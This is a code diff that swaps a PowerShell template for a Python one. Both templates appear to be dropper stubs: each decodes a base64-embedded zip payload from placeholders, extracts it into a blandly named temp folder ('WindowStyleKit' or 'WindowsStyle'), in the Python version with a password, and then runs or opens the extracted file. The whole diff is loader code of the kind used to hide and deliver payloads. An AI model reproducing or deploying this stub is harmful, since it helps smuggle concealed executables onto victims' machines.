@@ -1,19 +1,29 @@
-$exec = %exec%
-$folder = %folder%
-$base64String = %b64zip%
+import tempfile
+import os
+import base64
 
-$temp = New-TemporaryFile
-$tempName = $temp.Name + ".zip"
-$temp_path = $temp.DirectoryName
+from zipfile import ZipFile
 
-Rename-Item -Path $temp.Fullname -NewName ($temp.Name + ".zip")
+temp = tempfile.NamedTemporaryFile("wb", delete=False, suffix=".zip")
 
-$bytes = [System.Convert]::FromBase64String($base64String)
+dirtemp = "WindowsStyle"
+dirtempPath = os.path.join( os.path.dirname(os.path.abspath(temp.name)), dirtemp )
 
-Set-Content -Path $tempName -Value $bytes -Encoding Byte
+base64zip = %b64zip%
+filexec = %filexec%
+password = %password%
 
-Expand-Archive -Path $tempName -DestinationPath (Join-Path $temp_path "WindowStyleKit") -Force
-Remove-Item $temp_path\$tempName
+try:
+    temp.write(base64.standard_b64decode(base64zip))
+finally:
+    temp.close()
 
-Set-Location $temp_path\WindowStyleKit\$folder
-Start-Process -FilePath $exec
+    if not os.path.exists(dirtempPath): os.mkdir(dirtempPath)
+
+    with ZipFile(temp.name, "r") as archive:
+        archive.setpassword(password)
+        archive.extractall(dirtempPath)
+
+
+    os.system("notepad " + os.path.join(dirtempPath, filexec))
+    os.remove(temp.name)
